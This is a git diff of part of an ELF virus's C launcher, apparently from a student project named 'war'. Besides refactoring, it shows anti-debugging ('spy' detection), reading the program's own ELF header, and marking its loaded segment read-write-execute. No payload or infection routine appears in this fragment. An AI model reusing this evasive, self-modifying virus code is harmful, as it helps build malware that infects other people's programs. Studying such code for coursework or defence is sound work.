@@ -6,14 +6,15 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 21:50:15 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 00:16:00 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
+#include "accessors.h"
 #include "loader.h"
 #include "syscall.h"
 #include "utils.h"
-#include "accessors.h"
+#include "virus.h"
 
 /*
 ** _start is the launcher function of the virus
@@ -27,19 +28,19 @@
 void	_start(void)
 {
 	if (detect_spy())
-		sys_exit(ft_putstr("spy detected!\n"));
+		sys_exit(putstr("spy detected!\n"));
 
 	struct safe_ptr	launcher_file;
 	if (!init_original_safe(&launcher_file, "./war"))
-		sys_exit(ft_putstr("failed to create safe accessor for file ./war\n"));
+		sys_exit(putstr("failed to create safe accessor for file ./war\n"));
 
 	struct entry		file_info;
 	if (!find_entry(&file_info, launcher_file))
-		sys_exit(ft_putstr("failed to find entry\n"));
+		sys_exit(putstr("failed to find entry\n"));
 
-	struct elf64_hdr	*elf_hdr = safe(launcher_file, 0, sizeof(*elf_hdr));
+	Elf64_Ehdr		*elf_hdr = safe(launcher_file, 0, sizeof(Elf64_Ehdr));
 	if (elf_hdr == NULL)
-		sys_exit(ft_putstr("failed to read elf header\n"));
+		sys_exit(putstr("failed to read elf header\n"));
 
 	size_t	p_vaddr         = file_info.safe_phdr->p_vaddr;
 	size_t	entry_vaddr     = elf_hdr->e_entry;
@@ -50,7 +51,7 @@ void	_start(void)
 	int	prot_rwx      = 0x07;
 
 	if (sys_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
-		sys_exit(ft_putstr("failed to make current PT_LOAD writable\n"));
+		sys_exit(putstr("failed to make current PT_LOAD writable\n"));
 
 	uint64_t seed[2] = {0l, ~0l};
 
